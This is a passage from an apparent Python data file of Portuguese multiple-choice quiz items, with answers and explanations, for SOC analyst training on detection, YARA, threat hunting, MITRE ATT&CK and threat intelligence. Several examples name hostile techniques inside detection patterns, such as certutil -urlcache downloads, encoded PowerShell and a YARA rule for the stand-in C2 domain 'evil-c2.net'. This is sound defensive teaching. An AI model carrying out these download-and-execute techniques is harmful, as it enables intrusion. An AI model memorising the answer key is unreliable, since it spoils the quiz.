     ["Desligar a regra cria um ponto cego total.", "Excluir o servidor inteiro deixa o atacante livre ali.", "Ignorar alertas leva a perder o verdadeiro."],
     "Toda exclusão tem dono, motivo e data de revisão.",
     "filter: Image endswith '\\inventory.exe' and Computer == 'SRV-INV01'."),
    ("Deteccao", "Qual a diferença entre detecção por IOC e por comportamento (TTP)?",
     ["IOC procura um artefato específico (hash, IP); TTP procura o jeito de atacar", "Não há diferença", "IOC só funciona em Linux", "TTP é um tipo de antivírus"],
     "Comportamento continua funcionando quando o atacante troca o IP ou o arquivo.",
     ["São bem diferentes em robustez.", "IOCs funcionam em qualquer sistema.", "TTP é um conceito, não um produto."],
     "As duas são úteis: IOC é rápido e preciso; TTP pega variações.",
     "IOC: hash X. TTP: qualquer documento do Office abrindo PowerShell."),
    ("Deteccao", "Para que serve o YARA?",
     ["Para escrever regras que identificam arquivos (malware) por strings e bytes", "Para analisar tráfego de rede", "Para gerenciar senhas", "Para criar tickets"],
     "YARA é o padrão para classificar arquivos.",
     ["Tráfego de rede é Suricata ou Snort.", "Não gerencia senhas.", "Não cria tickets."],
     "Muitos EDRs e sandboxes aceitam regras YARA.",
     "rule Exemplo { strings: $a = \"evil-c2.net\" condition: $a }"),
    ("Deteccao", "O que é fadiga de alertas?",
     ["Quando há tanto alerta falso que o time passa a ignorar, e perde o verdadeiro", "Cansaço do servidor do SIEM", "Um tipo de malware", "Quando a regra para de funcionar à noite"],
     "Ruído demais esconde o sinal. Tuning é parte do trabalho.",
     ["É um problema humano e de processo.", "Não é malware.", "Regras não dormem."],
     "Métrica útil: porcentagem de verdadeiros positivos por regra.",
     "Uma regra com 2% de verdadeiros positivos precisa de ajuste."),
    ("Deteccao", "Uma regra de limite (threshold) funciona como?",
     ["Alerta quando uma contagem passa de um valor num período", "Alerta sempre que um evento aparece", "Bloqueia o usuário automaticamente", "Apaga logs antigos"],
     "Ex.: mais de 20 falhas de login em 5 minutos.",
     ["Isso seria uma regra simples, sem limite.", "Bloquear é resposta, não detecção.", "Retenção de logs é outra configuração."],
     "Limites baixos geram ruído; limites altos deixam passar ataques lentos (low and slow).",
     "No lab: R001 alerta quando um IP passa do limite de falhas na janela de tempo."),
    ("Deteccao", "O que é threat hunting?",
     ["Procurar ativamente ataques que as regras não pegaram, a partir de uma hipótese", "Esperar os alertas chegarem", "Caçar hackers fisicamente", "Apagar contas antigas"],
     "É proativo: você parte de uma ideia ('e se alguém está usando certutil para baixar arquivos?') e procura nos dados.",
     ["Esperar alertas é reativo.", "Não é trabalho de polícia.", "Limpeza de contas é administração."],
     "Uma caçada bem-sucedida costuma virar uma nova regra de detecção.",
     "Hipótese: LOLBins baixando arquivos. Busca: process_creation com certutil e -urlcache."),
    ("Deteccao", "Por que mapear regras no MITRE ATT&CK (tags como attack.t1059.001)?",
     ["Para saber quais técnicas estão cobertas e quais não", "Para deixar a regra mais rápida", "Porque o SIEM exige", "Para traduzir a regra para o inglês"],
     "Com o mapeamento, você vê os buracos de cobertura no ATT&CK Navigator.",
     ["Não muda a velocidade.", "Não é obrigatório, mas é boa prática.", "Não tem relação com idioma."],
     "Também ajuda o analista a entender o alerta: qual objetivo do atacante aquilo representa.",
     "tags: attack.execution, attack.t1059.001 → Execution / PowerShell."),
    # ---------------------------------------------------------------- Threat Intel e MITRE
    ("CTI", "Qual a diferença entre um IOC e um TTP?",
     ["IOC é um artefato (hash, IP, domínio); TTP é o jeito de atacar", "IOC é um tipo de ataque e TTP é um antivírus", "São sinônimos", "TTP é um endereço IP"],
     "IOC é fácil de trocar; TTP é difícil. Por isso detectar TTP é mais forte.",
     ["Nenhum dos dois é antivírus.", "São conceitos diferentes.", "IP é um IOC."],
     "TTP = Tactics, Techniques and Procedures.",
     "IOC: invoice-portal.net. TTP: phishing com fatura em atraso → macro → PowerShell."),
    ("CTI", "Na pirâmide da dor, qual indicador é mais fácil de o atacante trocar?",
     ["Hash de arquivo", "TTPs", "Ferramentas", "Artefatos de host"],
     "Mudar um byte do arquivo gera um hash novo.",
     ["TTPs são o topo: os mais difíceis de mudar.", "Trocar de ferramenta dá trabalho.", "Artefatos dão mais trabalho que um hash."],
     "Por isso, regra só por hash pega pouco tempo.",
     "O mesmo malware, recompilado, tem outro SHA256."),
    ("CTI", "O que o GreyNoise ajuda a descobrir sobre um IP?",
     ["Se ele é só 'ruído' de varredura em massa da internet ou algo direcionado", "O dono do domínio", "A senha do roteador", "O modelo do computador"],
     "IPs que varrem a internet inteira geram muitos alertas, mas raramente são ataques direcionados.",
     ["Dono de domínio se vê no WHOIS.", "Não revela senhas.", "Não revela hardware."],
     "Ajuda a priorizar: varredura em massa é menos urgente que um IP que só ataca você.",
     "GreyNoise: 'benign scanner (Shodan)' → baixa prioridade."),
    ("CTI", "Por que não enviar um documento interno suspeito para o VirusTotal?",
     ["Porque o arquivo fica disponível para outras pessoas e pode vazar dados", "Porque o VirusTotal é pago", "Porque ele apaga o arquivo", "Porque só aceita imagens"],
     "Arquivos enviados podem ser baixados por assinantes. Prefira consultar o hash.",
     ["Consultar é gratuito.", "Não apaga nada.", "Aceita qualquer tipo de arquivo."],
     "Consultar o SHA256 mostra o resultado sem enviar o conteúdo.",
     "Get-FileHash fatura.docm → pesquisar o hash no VirusTotal."),
    ("CTI", "O que significa TLP:AMBER?",
     ["Pode compartilhar só dentro da sua organização (e com clientes que precisam saber)", "Pode publicar na internet", "Só quem estava na reunião pode saber", "É uma ameaça de nível crítico"],
     "AMBER = necessidade de saber, dentro da organização. AMBER+STRICT = só a organização.",
     ["Público é TLP:CLEAR.", "Só os presentes é TLP:RED.", "TLP fala de compartilhamento, não de gravidade."],
     "TLP:GREEN pode ir para a comunidade (outras empresas do setor), mas não para o público.",
     "Relatório do ISAC marcado TLP:AMBER: use internamente, não poste no LinkedIn."),
    ("CTI", "No MITRE ATT&CK, o que é uma tática?",
     ["O objetivo do atacante naquela etapa (o porquê)", "O nome de um grupo de hackers", "Um tipo de antivírus", "O hash de um malware"],
     "Ex.: Initial Access, Persistence, Credential Access. As técnicas são o 'como'.",
     ["Grupos têm IDs como G0016.", "Não é produto.", "Hash é IOC."],
     "A matriz Enterprise tem 14 táticas.",
     "Tática Credential Access → técnica T1003 OS Credential Dumping."),
    ("CTI", "Qual técnica do MITRE ATT&CK corresponde a phishing?",
     ["T1566", "T1110", "T1486", "T1078"],
     "T1566 Phishing, com subtécnicas como T1566.001 (anexo) e T1566.002 (link).",
     ["T1110 é força bruta.", "T1486 é criptografar dados (ransomware).", "T1078 é uso de contas válidas."],
     "Phishing fica na tática Initial Access.",
     "E-mail com fatura .docm maliciosa = T1566.001 Spearphishing Attachment."),
    ("CTI", "O que é T1059.001?",
     ["A subtécnica PowerShell da técnica Command and Scripting Interpreter", "Um hash de malware", "Um evento do Windows", "Um grupo de ransomware"],
     "O número depois do ponto indica subtécnica.",
     ["Hashes são longas sequências hexadecimais.", "Eventos do Windows têm IDs como 4625.", "Grupos têm IDs G0xxx."],
     "T1059.003 é o Windows Command Shell (cmd).",
     "powershell -enc ... → Execution / T1059.001."),
    ("CTI", "Saiu um relatório com 15 domínios e 10 hashes de uma campanha nova. O que um analista de SOC faz?",
     ["Procura esses IOCs no SIEM e no EDR nos últimos dias e meses, e avalia o bloqueio", "Ignora, porque ainda não houve alerta", "Bloqueia a internet da empresa", "Publica os IOCs no Twitter sem checar o TLP"],
     "Retro-hunt: ver se a campanha já passou por aqui antes de existir a regra.",
     ["A ausência de alerta não prova nada: as regras ainda não conheciam esses IOCs.", "Cortar a internet de todos para a empresa inteira por causa de 25 indicadores.", "Compartilhar depende do TLP."],
     "Antes de bloquear, confirme que o domínio não é legítimo nem compartilhado.",
     "index=proxy dest_host IN (lista) earliest=-90d → nenhum acesso. Bloquear e registrar."),
    ("CTI", "Por que um IOC antigo pode causar problema se for bloqueado?",
     ["O IP ou domínio pode ter mudado de dono e hoje ser legítimo ou compartilhado", "Porque IOCs antigos são sempre falsos", "Porque bloquear é proibido", "Não causa problema nenhum"],
     "IPs de nuvem e CDN mudam de dono o tempo todo. Bloquear pode derrubar serviços legítimos.",
     ["Nem sempre são falsos, mas perdem validade.", "Bloquear é normal, com cuidado.", "Pode derrubar sites e serviços."],
     "Bons feeds informam a data em que o IOC foi visto pela última vez e a confiança.",
     "IP de um VPS malicioso em 2023 hoje hospeda o site de uma padaria."),
    ("CTI", "O que é o MISP?",
     ["Uma plataforma aberta para guardar e compartilhar inteligência de ameaças", "Um antivírus da Microsoft", "Um protocolo de e-mail", "Um tipo de firewall"],
     "Empresas e CERTs usam o MISP para trocar IOCs e contexto.",
     ["Não é antivírus.", "E-mail usa SMTP, IMAP.", "Não é firewall."],
     "Os eventos do MISP podem alimentar o SIEM com IOCs automaticamente.",
     "Um CERT publica a campanha no MISP com TLP:GREEN; seu SIEM importa os IOCs."),
]
